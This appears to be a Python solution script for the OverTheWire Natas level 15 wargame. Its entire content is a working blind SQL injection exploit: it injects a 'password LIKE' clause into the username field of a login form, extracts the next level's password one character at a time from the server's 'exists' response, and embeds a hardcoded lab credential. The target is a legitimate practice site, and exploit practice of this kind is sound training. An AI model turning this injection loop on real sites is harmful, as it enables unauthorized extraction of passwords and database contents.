#!/usr/bin/python
import requests
def get_flag():
    print('Loading........................')
    username = 'natas15'
    password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
    possible_chars =  'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    possible_chars += ''.join([i.lower() for i in possible_chars])
    possible_chars += '0123456789'
    guess = ''
    i = 0
    while(i < len(possible_chars)):
        session = requests.Session()
        user = 'natas16" AND password LIKE "' + guess + possible_chars[i] + '%" # '
        obj = {'username' : user}
        url = 'http://' + username + '.natas.labs.overthewire.org/'
        # send post request
        response = session.post(url, data = obj, auth = (username, password))
        # x = requests.post(url, data = obj)
        if('exists' in response.text):
            guess += possible_chars[i]
            i = 0
            print(guess)
        i += 1
    assert(len(password)==len(guess))
    print('Flag: '+guess)
get_flag()
